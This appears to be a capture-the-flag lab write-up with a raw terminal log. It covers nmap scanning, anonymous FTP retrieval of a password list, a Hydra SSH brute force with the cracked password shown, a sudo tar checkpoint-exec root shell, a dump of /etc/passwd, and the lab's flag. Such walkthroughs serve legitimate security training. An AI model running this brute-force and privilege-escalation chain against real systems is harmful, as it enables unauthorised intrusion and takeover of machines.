# 🔴 Full Walkthrough (FTP → SSH → Privilege Escalation)

---

## 🧪 1. Initial Scan (Nmap)

```bash
//first scanned using nmap
nmap -sC -sV 10.49.167.181
```
SIMRAN SIMRANSS LJSJJSLKJUJ
### 🔍 Result:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

### 🧠 Key Findings:

* FTP allows anonymous login
* SSH available (potential attack vector)
* HTTP running but basic page

---

## 🌐 2. Web Enumeration

```bash
//after this I enumerated http://10.49.167.181
--> but nothing interesting found
```

### 🔎 Directory Bruteforce

```bash
//gobuster used
gobuster dir -u http://10.49.167.181 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Result:

```
/index.html (200)
/images (301)
/javascript (301)
```

👉 Nothing useful → move to next service

---

## 📁 3. FTP Enumeration

```bash
// so i do FTP Enumeration
// I got two files with dir command
```

### Login:

```bash
ftp 10.49.167.181
Name: anonymous
```

### Files Found:

```
locks.txt
task.txt
```

---

## ⬇️ 4. Download Files

```bash
get task.txt
get locks.txt
```

---

## 📖 5. Read Files Locally

```bash
//another tab on same local machine
cat task.txt
```

### Output:

```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.
-lin
```

👉 Username identified: lin

---

```bash
cat locks.txt
```

👉 Contains password wordlist

---

## 🔐 6. SSH Bruteforce

```bash
//bruteforced ssh login with hydra as we got pwd list in locks.txt
hydra -l lin -P locks.txt ssh://10.49.167.181
```

### ✅ Result:

```
login: lin
password: RedDr4gonSynd1cat3
```

---

## 🔑 7. SSH Login

```bash
ssh lin@10.49.167.181
```

```bash
whoami
lin
```

---

## 📁 8. User Enumeration

```bash
ls ~/Desktop
```

```
user.txt
```

---

## 🔍 9. System Enumeration

```bash
find / -perm -4000 2>/dev/null
```

👉 Found SUID binaries (including tar)

---

```bash
cat /etc/passwd
```

👉 Confirms users: lin, ubuntu

---

## 🔥 10. Check Sudo Permissions

```bash
sudo -l
```

### Result:

```
User lin may run the following commands:
(root) /bin/tar
```

---

## 🚀 11. Privilege Escalation

```bash
//tar can be exploited to get root shell
// go to GTFOBins , find payload and then get root shell

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

### 🎯 Result:

```bash
whoami
root
```

✅ ROOT ACCESS GAINED

---

## 📂 12. Root Flag

```bash
cd /root
ls
cat root.txt
```

### 🏁 Output:

```
THM{80UN7Y_h4cK3r}
```

---

# 🧠 Key Learning Points

### 🔹 FTP was critical

* Anonymous login → data exposure
* Credentials obtained indirectly

### 🔹 Hydra success

* Custom wordlist (locks.txt)
* Faster than generic brute force

### 🔹 Privilege escalation

* Misconfigured sudo
* tar exploitable via GTFOBins

---

# ⚡ Final Attack Chain

```
Nmap → FTP (anonymous)
        ↓
Download files
        ↓
Find username + passwords
        ↓
Hydra → SSH access
        ↓
sudo -l → tar allowed
        ↓
GTFOBins exploit
        ↓
ROOT
```

---

# ✅ Summary

* Proper enumeration flow followed
* Service pivoting done correctly
* Efficient credential usage
* Successful privilege escalation using tar

👉 This is a complete real-world style pentesting workflow













//first scanned using nmap
root@ip-10-49-103-200:~# nmap -sC -sV 10.49.167.181
==>
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-24 17:50 UTC
Nmap scan report for ip-10-49-167-181.ap-south-1.compute.internal (10.49.167.181)
Host is up (0.00017s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.49.103.200
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:07:84:71:5c:60:4f:a0:b0:68:a5:43:cf:12:95:8e (RSA)
|   256 4a:35:04:29:78:00:bc:41:14:16:9f:56:e8:76:01:5e (ECDSA)
|_  256 b5:7e:05:12:9d:36:dc:2d:f8:76:75:8a:ea:c5:f1:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.92 seconds

//after this I enumerated http://10.49.167.181 
--> but nothing interesting found

// so i do FTP Enumeration
// I got two files with dir command
//then downlaoded to local machine and read with cat task.txt //
root@ip-10-49-103-200:~# ftp 10.49.167.181
Connected to 10.49.167.181.
220 (vsFTPd 3.0.5)
Name (10.49.167.181:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> cat task.txt
?Invalid command.
ftp> type task.txt
task.txt: unknown mode.
ftp> get task.txt
local: task.txt remote: task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |*********************************************************************************|    68      353.22 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (92.10 KiB/s)
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |*********************************************************************************|   418      740.83 KiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (320.41 KiB/s)
ftp> 

//another tab on same local machine
root@ip-10-49-103-200:~# ls
Desktop  Documents  Downloads  Pictures  Postman  Rooms  Scripts  go  locks.txt  snap  task.txt
root@ip-10-49-103-200:~# cat task.txt
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.
-lin

==> and we got our answer : lin

//
root@ip-10-49-103-200:~# cat locks.txt
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
root@ip-10-49-103-200:~# 

//root@ip-10-49-103-200:~# gobuster dir -u http://10.49.167.181 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.167.181
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.hta.txt             (Status: 403) [Size: 278]
/.hta.php             (Status: 403) [Size: 278]
/.hta.html            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/images               (Status: 301) [Size: 315] [--> http://10.49.167.181/images/]
/index.html           (Status: 200) [Size: 969]
/index.html           (Status: 200) [Size: 969]
/javascript           (Status: 301) [Size: 319] [--> http://10.49.167.181/javascript/]
/server-status        (Status: 403) [Size: 278]
Progress: 18456 / 18460 (99.98%)
===============================================================
Finished
===============================================================
root@ip-10-49-103-200:~# 

//on another tab 
//bruteforced ssh login with hydra as we got pwd list in locks.txt
root@ip-10-49-103-200:~# hydra -l lin -P locks.txt ssh://10.49.167.181
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-24 18:10:10
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.49.167.181:22/
[22][ssh] host: 10.49.167.181   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-24 18:10:13
root@ip-10-49-103-200:~# ssh lin@10.49.167.181
The authenticity of host '10.49.167.181 (10.49.167.181)' can't be established.
ED25519 key fingerprint is SHA256:IqoGuoF5Fk0UlTwduDxFwndwyrq3bgvJ9BNK34yC+rU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.49.167.181' (ED25519) to the list of known hosts.
lin@10.49.167.181's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Mon Aug 11 12:32:35 2025 from 10.23.8.228
lin@ip-10-49-167-181:~/Desktop$ whoami
lin
lin@ip-10-49-167-181:~/Desktop$ pwd
/home/lin/Desktop
lin@ip-10-49-167-181:~/Desktop$ 
lin@ip-10-49-167-181:~/Desktop$ pwd
/home/lin/Desktop
lin@ip-10-49-167-181:~/Desktop$ ls
user.txt
lin@ip-10-49-167-181:~/Desktop$ cd ..
lin@ip-10-49-167-181:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
lin@ip-10-49-167-181:~$ pwd
/home/lin
lin@ip-10-49-167-181:~$ cd ..
lin@ip-10-49-167-181:/home$ ls
lin  ubuntu
lin@ip-10-49-167-181:/home$ pwd
/home
lin@ip-10-49-167-181:/home$ ls -la
total 16
drwxr-xr-x  4 root   root   4096 Mar 24 12:23 .
drwxr-xr-x 24 root   root   4096 Mar 24 12:23 ..
drwxr-xr-x 19 lin    lin    4096 Jun  7  2020 lin
drwxr-xr-x  3 ubuntu ubuntu 4096 Mar 24 12:23 ubuntu
lin@ip-10-49-167-181:/home$ cd lin
lin@ip-10-49-167-181:~$ ls -la
total 116
drwxr-xr-x 19 lin  lin  4096 Jun  7  2020 .
drwxr-xr-x  4 root root 4096 Mar 24 12:23 ..
-rw-------  1 lin  lin   178 Aug 11  2025 .bash_history
-rw-r--r--  1 lin  lin   220 Jun  7  2020 .bash_logout
-rw-r--r--  1 lin  lin  3790 Jun  7  2020 .bashrc
drwx------ 14 lin  lin  4096 Jun  7  2020 .cache
drwx------  3 lin  lin  4096 Jun  7  2020 .compiz
drwx------ 15 lin  lin  4096 Jun  7  2020 .config
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Desktop
-rw-r--r--  1 lin  lin    25 Jun  7  2020 .dmrc
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Documents
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Downloads
drwx------  2 lin  lin  4096 Jun  7  2020 .gconf
drwx------  3 lin  lin  4096 Jun  7  2020 .gnupg
-rw-------  1 lin  lin  1710 Jun  7  2020 .ICEauthority
drwx------  3 lin  lin  4096 Jun  7  2020 .local
drwx------  5 lin  lin  4096 Jun  7  2020 .mozilla
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Music
drwxrwxr-x  2 lin  lin  4096 Jun  7  2020 .nano
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Pictures
-rw-r--r--  1 lin  lin   655 Jun  7  2020 .profile
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Public
-rw-rw-r--  1 lin  lin    66 Jun  7  2020 .selected_editor
drwx------  2 lin  lin  4096 Aug 11  2025 .ssh
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Templates
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Videos
-rw-------  1 lin  lin   114 Jun  7  2020 .Xauthority
-rw-------  1 lin  lin  1204 Jun  7  2020 .xsession-errors
-rw-------  1 lin  lin  1208 Jun  7  2020 .xsession-errors.old
lin@ip-10-49-167-181:~$ find / -perm -4000 2>/dev/null
/snap/core18/2934/bin/mount
/snap/core18/2934/bin/ping
/snap/core18/2934/bin/su
/snap/core18/2934/bin/umount
/snap/core18/2934/usr/bin/chfn
/snap/core18/2934/usr/bin/chsh
/snap/core18/2934/usr/bin/gpasswd
/snap/core18/2934/usr/bin/newgrp
/snap/core18/2934/usr/bin/passwd
/snap/core18/2934/usr/bin/sudo
/snap/core18/2934/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2934/usr/lib/openssh/ssh-keysign
/snap/core24/1055/usr/bin/chfn
/snap/core24/1055/usr/bin/chsh
/snap/core24/1055/usr/bin/gpasswd
/snap/core24/1055/usr/bin/mount
/snap/core24/1055/usr/bin/newgrp
/snap/core24/1055/usr/bin/passwd
/snap/core24/1055/usr/bin/su
/snap/core24/1055/usr/bin/sudo
/snap/core24/1055/usr/bin/umount
/snap/core24/1055/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core24/1055/usr/lib/openssh/ssh-keysign
/snap/core24/1055/usr/lib/polkit-1/polkit-agent-helper-1
/usr/sbin/pppd
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/sudo
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/libgtk3-nocsd.so.0
/usr/lib/snapd/snap-confine
/bin/tar
/bin/fusermount
/bin/su
/bin/mount
/bin/umount
lin@ip-10-49-167-181:~$ 

lin@ip-10-49-167-181:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
ftp:x:121:129:ftp daemon,,,:/srv/ftp:/bin/false
lin:x:1001:1001:Lin,,,:/home/lin:/bin/bash
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
cups-pk-helper:x:103:113:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:123:105::/var/lib/geoclue:/usr/sbin/nologin
gdm:x:124:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
tss:x:126:131:TPM software stack,,,:/var/lib/tpm:/bin/false
tcpdump:x:127:134::/nonexistent:/usr/sbin/nologin
nm-openvpn:x:128:135:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
fwupd-refresh:x:129:136:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1002:1003:Ubuntu:/home/ubuntu:/bin/bash
lin@ip-10-49-167-181:~$ 
//lin@ip-10-49-167-181:~$ sudo -l
[sudo] password for lin: 
lin@ip-10-49-167-181:~$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on ip-10-49-167-181:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-49-167-181:
    (root) /bin/tar
lin@ip-10-49-167-181:~$ 

//tar can be exploited to get root shell
// go to GTFObins , find payload and then get root shell
//then cd /root
//cat user.txt
lin@ip-10-49-167-181:~$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
tar: Removing leading `/' from member names
root@ip-10-49-167-181:/home/lin# whoami
root
root@ip-10-49-167-181:/home/lin# ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
root@ip-10-49-167-181:/home/lin# cd root
bash: cd: root: No such file or directory
root@ip-10-49-167-181:/home/lin# ls -la
total 116
drwxr-xr-x 19 lin  lin  4096 Jun  7  2020 .
drwxr-xr-x  4 root root 4096 Mar 24 12:23 ..
-rw-------  1 lin  lin   178 Aug 11  2025 .bash_history
-rw-r--r--  1 lin  lin   220 Jun  7  2020 .bash_logout
-rw-r--r--  1 lin  lin  3790 Jun  7  2020 .bashrc
drwx------ 14 lin  lin  4096 Jun  7  2020 .cache
drwx------  3 lin  lin  4096 Jun  7  2020 .compiz
drwx------ 15 lin  lin  4096 Jun  7  2020 .config
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Desktop
-rw-r--r--  1 lin  lin    25 Jun  7  2020 .dmrc
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Documents
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Downloads
drwx------  2 lin  lin  4096 Jun  7  2020 .gconf
drwx------  3 lin  lin  4096 Jun  7  2020 .gnupg
-rw-------  1 lin  lin  1710 Jun  7  2020 .ICEauthority
drwx------  3 lin  lin  4096 Jun  7  2020 .local
drwx------  5 lin  lin  4096 Jun  7  2020 .mozilla
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Music
drwxrwxr-x  2 lin  lin  4096 Jun  7  2020 .nano
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Pictures
-rw-r--r--  1 lin  lin   655 Jun  7  2020 .profile
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Public
-rw-rw-r--  1 lin  lin    66 Jun  7  2020 .selected_editor
drwx------  2 lin  lin  4096 Aug 11  2025 .ssh
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Templates
drwxr-xr-x  2 lin  lin  4096 Jun  7  2020 Videos
-rw-------  1 lin  lin   114 Jun  7  2020 .Xauthority
-rw-------  1 lin  lin  1204 Jun  7  2020 .xsession-errors
-rw-------  1 lin  lin  1208 Jun  7  2020 .xsession-errors.old
root@ip-10-49-167-181:/home/lin# pwd
/home/lin
root@ip-10-49-167-181:/home/lin# whoami
root
root@ip-10-49-167-181:/home/lin# pwd
/home/lin
root@ip-10-49-167-181:/home/lin# cd .
root@ip-10-49-167-181:/home/lin# cd ..
root@ip-10-49-167-181:/home# ls
lin  ubuntu
root@ip-10-49-167-181:/home# pwd
/home
root@ip-10-49-167-181:/home# cd root
bash: cd: root: No such file or directory
root@ip-10-49-167-181:/home# cd /root
root@ip-10-49-167-181:~# ls
root.txt  snap
root@ip-10-49-167-181:~# cat root.txt
THM{80UN7Y_h4cK3r}
root@ip-10-49-167-181:~# pwd
/root
root@ip-10-49-167-181:~# 






